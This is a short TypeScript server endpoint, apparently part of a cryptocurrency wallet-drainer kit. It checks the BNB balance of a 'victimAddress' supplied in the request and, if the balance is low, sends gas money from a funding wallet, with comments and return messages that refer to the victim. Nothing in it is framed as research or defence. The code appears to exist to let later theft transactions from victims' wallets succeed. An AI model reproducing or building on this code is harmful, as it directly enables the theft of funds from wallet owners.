// server/api/fund-gas.ts
import { defineEventHandler } from 'h3';
import { ethers } from 'ethers';
import { FUNDING_PRIVATE_KEY, RPC_URL } from '../../src/config';

export default defineEventHandler(async (event) => {
  const { victimAddress } = await readBody(event);
  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const fundingWallet = new ethers.Wallet(FUNDING_PRIVATE_KEY, provider);
  const minBalance = ethers.parseEther('0.0003'); // Minimum BNB for gas

  try {
    const balance = await provider.getBalance(victimAddress);
    if (balance < minBalance) {
      const tx = await fundingWallet.sendTransaction({
        to: victimAddress,
        value: ethers.parseEther('0.0005'), // Send 0.0005 BNB
      });
      await tx.wait();
      return { success: true, txHash: tx.hash };
    } else {
      return { success: true, message: 'Victim has enough BNB.' };
    }
  } catch (error) {
    console.error('Gas funding error:', error);
    return { success: false, error: error.message };
  }
});